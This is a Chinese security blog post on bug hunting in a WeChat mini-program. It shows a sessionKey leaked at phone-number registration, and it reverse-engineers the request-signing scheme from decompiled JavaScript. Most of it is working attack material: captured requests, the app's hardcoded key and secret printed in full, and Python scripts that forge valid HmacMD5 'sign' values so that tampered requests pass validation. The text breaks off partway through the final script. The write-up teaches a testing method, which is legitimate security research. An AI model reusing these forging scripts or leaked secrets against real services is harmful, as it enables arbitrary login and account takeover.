---
title: sign加密小程序漏洞挖掘
url: https://www.anquanke.com/post/id/299052
source: 安全客-有思想的安全新媒体
date: 2024-08-30
fetch_date: 2025-10-06T18:01:27.981192
---

# sign加密小程序漏洞挖掘

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# sign加密小程序漏洞挖掘

阅读量**533256**

|评论**1**

发布时间 : 2024-08-29 03:21:11

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

# **sign加密小程序漏洞挖掘**

## 前言

通过本篇论文，你可以了解两个知识点：

1. sign加密解密
2. 小程序漏洞挖掘

## 漏洞发现

注册的时候点击一个获取手机号

![]()

这里通过burp可以看到微信小程序获取手机号的三个关键参数，decryptData，sessionKey和iv。

正常情况是只有decryptData和iv，如果看到sessionKey基本就是一个任意登录漏洞了。

正常的小程序在获取微信提供的用户数据的时候通过sessionKey来提供甲基咪，这个sessionKey就是会话密钥，可以简单理解为微信开放数据AES加密的密钥，它是微信服务器给开发者服务器颁发的身份凭证，这个数据正常来说是不能通过任何方式泄露出去的。

![]()

首先我们通过burp的插件sessionkey crypt解密一下

![]()

但是这里存在一个问题，这里存在sign值的验证

![]()

那现成的漏洞我们拿不到，接下来我们要通过逆向去吧sign的值解密出来，看看加密逻辑然后重新实现。

## sign解密

### **减法操作**

在测试加密的时候，首先要做减法，看看影响sign的参数有哪些。

首先发送一个正常数据包

![]()

现在可以发送，我一点点减少

![]()

如果再减少一行的话（我这里删除了App\_type: 3，不管是哪一个都是这样），会出现”公共请求Head参数缺失。”

![]()

这里可以思考一下，还可以减少吗？

其实是可以的，我们刚才减少的是参数，如果我不去参数，我去掉参数的值呢，某一些参数是可以删除的，这里通过这个，我们可以进一步判断sign的影响值是哪个。

![]()

现在我们可以判断，影响sign的值有key，Timestamp和数据包。

接下来我们再少一点，找一个没有传输数据的数据包做测试。

![]()

这里的影响就只有key和sign了。

### **反汇编**

找到减法了，接下里就是小程序反汇编，首先这里的sign是32为，很想md5，小程序反汇编后直接找关键词，md5，sign，encode等等。

![]()

![]()

在md5的时候看到一个sign加密，而且还是用HmacMD5的，看一下这个代码。

…..

sign: function(e, t, n) {

varr=n(“7123”),

o=n(“8664”);

n(“5622”),

n(“3524”);

vari=”B272F43387B8504C”,

a=”weixin”,

s=”70BAE8B491362AB39042B77C7653199D”;

functionu(e, t) {

returnt.key<e.key?-1 : t.key>e.key?1 : 0

}

e.exports= {

signRequest: function(e) {

e=e|| {};

vart= {},

n= (newDate).valueOf() +6e4;

t.timestamp=n,

t.key=i,

t.app\_type=3,

t.OS\_type=3,

t.device\_id=a,

o.HmacMD5(s, n+””).toString(o.enc.Hex).substring(8, 24).toUpperCase();

varc= [],

l=”object”===r(e) &&”number”==typeofe.length;

for (varfine) {

vard=f;

l&& (d=e[f].key),

l?c.push(e[f]) : “object”===r(e[d]) ||c.push({

key: d,

value: e[d]

})

}

c.push({

key: “timestamp”,

value: n

}),

c.push({

key: “key”,

value: i

}),

c=c.sort(u);

varh=””;

for (varfinc) if ((d=c[f]).valueinstanceofArray) for (varpind.value) {

varg=d.value[p];

h+=d.key,

h+=g

} elseh+=d.key,

h+=d.value;

varv=o.HmacMD5(h+s, n+””).toString().toUpperCase();

returnt.sign=v,

t

},

test: function() {

o.HmacMD5(“timestamp1555661061471searchType2keyB272F43387B8504C70BAE8B491362AB39042B77C7653199D”, “1555661061471”).toString().toUpperCase()

}

}

},

…..

这里有一个误导的趋势，下面的demo函数里面有一个测试值，我们可以看到

varv=o.HmacMD5(h+s, n+””).toString().toUpperCase();

这里是用h和s，用n作为秘钥加密的，s是secret的值，是固定的s = “70BAE8B491362AB39042B77C7653199D”;

h前面的说法是h += d.value;也就是d的值相加

c.push({

key: “timestamp”,

value: n

}),

c.push({

key: “key”,

value: i

}),

c=c.sort(u);

varh=””;

for (varfinc) if ((d=c[f]).valueinstanceofArray) for (varpind.value) {

varg=d.value[p];

h+=d.key,

h+=g

} elseh+=d.key,

h+=d.value;

我们看到key和timestamp，结合我们刚才的无参数的值，再看看demo里面的

o.HmacMD5(“timestamp1555661061471searchType2keyB272F43387B8504C70BAE8B491362AB39042B77C7653199D”, “1555661061471”).toString().toUpperCase()

HmacMD5(timestamp+timestamp的值+searchType2[不知道干什么用的]+key+key的值+secret)再用时间戳作为秘钥

这里的误区就是searchType2，刚开始我以为他有用，发现死活加密不出来，后面不用这个值，直接加密发现就可以了。

无传输数据的数据包

Os\_type:

App\_type:

Device\_id:

Key: B272F43387B8504C

Sign: 73A8C93DC2A4CA79A8897879DDF54EA7

Content-Type: application/x-www-form-urlencoded

Timestamp: 1719387012630

Connection: close

Content-Length: 2

​

{}

加密脚本

importhmac

importhashlib

​

key = “B272F43387B8504C”;

timestamp = 1719387012630;

timestamp = str(timestamp)

secret = “70BAE8B491362AB39042B77C7653199D”;

str1 = ‘timestamp’+timestamp+’key’+key+secret

mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)

mac.digest()

str\_encode = mac.hexdigest().upper()

print(str\_encode)

# 73A8C93DC2A4CA79A8897879DDF54EA7

首次加密没问题了，接下来是有参数的，我找了一个只有一个参数的

![]()

刚才是直接拼接，再仔细看一下有一个排序操作`c = c.sort(u);`，从demo的timestamp—>searchType—>key，想着会不会是以ZYXWVUTSRQPONMLKJIHGFEDCBA排序，按这个思路，我把addressCode放到key的前面加密

Os\_type:

App\_type:

Device\_id:

Key: B272F43387B8504C

Sign: 285F822334E8978E25D92D8975A3479C

Content-Type: application/x-www-form-urlencoded

Timestamp: 1719387013084

Connection: close

Content-Length: 13

​

addressCode=2

输出脚本

importhmac

importhashlib

​

key = “B272F43387B8504C”;

timestamp = 1719387013084;

timestamp = str(timestamp)

secret = “70BAE8B491362AB39042B77C7653199D”;

addressCode = “2”

str1 = ‘timestamp’+timestamp+’key’+key+”addressCode”+addressCode+secret

mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)

mac.digest()

str\_encode = mac.hexdigest().upper()

print(str\_encode)

# 285F822334E8978E25D92D8975A3479C

所以思路就是把所有参数按字母排序然后加密出来，对于多个参数，这里是通过键值对的反思。

for (var f in c) if ((d = c[f]).value instanceof Array) for (var p in d.value) {

var g = d.value[p];

h += d.key,

h += g

}

把数据包的按=号前后提取分配，回到sessionkey来，测试sign的加密方式，这里在测试的时候发现直接进行url解密的时候会出现报错。

![]()

在处理加密的逻辑的时候，先按前面逻辑处理一下

Content-Length: 318

Os\_type:

Key: B272F43387B8504C

Sign: 03E03380485A6FE4BA9FFFD0AE555C42

Device\_id:

Content-Type: application/x-www-form-urlencoded

App\_type:

Timestamp: 1719387015597

Connection: close

​

decryptData=lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ%3D%3D&sessionKey=sRfHDswxxxxxxxxxxxx%3D%3D&iv=RpwxxxxxxxxxxxxzPQyTA%3D%3D

importhmac

importhashlib

​

key = “B272F43387B8504C”;

timestamp = 1719387015597;

timestamp = str(timestamp)

secret = “70BAE8B491362AB39042B77C7653199D”;

decryptData = “lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ”

sessionKey = “sRfHDswxxxxxxxxxxxx%3D%3D”

iv = “RpwxxxxxxxxxxxxzPQyTA%3D%3D”

str1 = ‘timestamp’+timestamp+’sessionKey’+sessionKey+’key’+key+’iv’+iv+”decryptData”+decryptData+secret

mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)

mac.digest()

str\_encode = mac.hexdigest().upper()

print(str\_encode)

#EEDB56B05B83B1A2D1660509F6387A06

这里是思考为什么报错，然后想着会不会是url解码问题，我在处理sign加密的时候加一个url解码，发现就可以了

importhmac

importhashlib

importurllib.parse

fromurllib.parseimportunquote

​

key = “B272F43387B8504C”;

timestamp = 1719387015597;

timestamp = str(timestamp)

secret = “70BAE8B491362AB39042B77C7653199D”;

decryptData = “lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ”

sessionKey = “sRfHDswxxxxxxxxxxxx%3D%3D”

iv = “RpwxxxxxxxxxxxxzPQyTA%3D%3D”

str1 = ‘timestamp’+timestamp+’sessionKey’+urllib.parse.unquote(sessionKey) +’key’+key+’iv’+urllib.parse.unquote(iv) +”decryptData”+urllib.parse.unquote(decryptData) +secret

mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)

mac.digest()

str\_encode = mac.hexdigest().upper()

print(str\_encode)

#03E03380485A6FE4BA9FFFD0AE555C42

现在sign值已经解密出来了，这样一步步写太麻烦了，就改进一下脚本。

importhmac

importhashlib

importurllib.parse

fromurllib.parseimportunquote

​

request\_data = f”””

Content-Length: 318

Os\_type:

Key: B272F43387B8504C

Sign: 03E03380485A6FE4BA9FFFD0AE555C42

Device\_id:

Content-Type: application/x-www-form-urlencoded

App\_type:

Timestamp: 1719387015597

Connection: close

​

decryptData=lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ%3D%3D&sessionKey=sRfHDswxxxxxxxxxxxx%3D%3D&iv=RpwxxxxxxxxxxxxzPQyTA%3D%3D

“””

params = request\_data.split(‘\n’)

formatted\_output = {“key”: “B272F43387B8504C”}

foriteminparams:

ifitem.startswith(‘Timestamp: ‘):

timestamp\_value = item.split(‘Timestamp: ‘)[1]

formatted\_output[‘timestamp’] = timestamp\_value

timestamp = timestamp\_value

datas = params[-2]

params\_list = datas.split(‘&’)

forparaminparams\_list:

key, value = param.split(‘=’, 1)

value = urllib.parse.unquote(value)

formatted\_output[key] = value

​

str1 = []...